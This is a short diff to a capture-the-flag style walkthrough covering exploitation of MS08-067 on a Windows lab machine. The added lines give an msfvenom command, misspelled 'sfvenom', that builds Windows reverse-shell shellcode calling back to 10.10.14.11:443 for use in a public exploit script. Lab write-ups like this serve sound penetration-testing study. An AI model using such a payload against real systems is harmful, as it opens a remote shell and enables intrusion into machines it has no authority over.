@@ -30,7 +30,10 @@ Both of these vulnerabilities (MS08-067 & MS-17-010) gives a shell as system and
 
 # 04: Exploitation
 
-MS08-067: I will use [this exploit](https://github.com/andyacer/ms08_067) for exploit the vulnerability, this script requires impacket and replace the default shellcode with some of my own. Ok, to make the shellcode i used *msfvenom* and 
+MS08-067: I will use [this exploit](https://github.com/andyacer/ms08_067) for exploit the vulnerability, this script requires impacket and replace the default shellcode with some of my own. Ok, to make the shellcode i used *msfvenom*:
+`
+sfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.11 LPORT=443 EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f py -v shellcode -a x86 --platform windows
+`
 
 # 05: Post-Exploitation
 
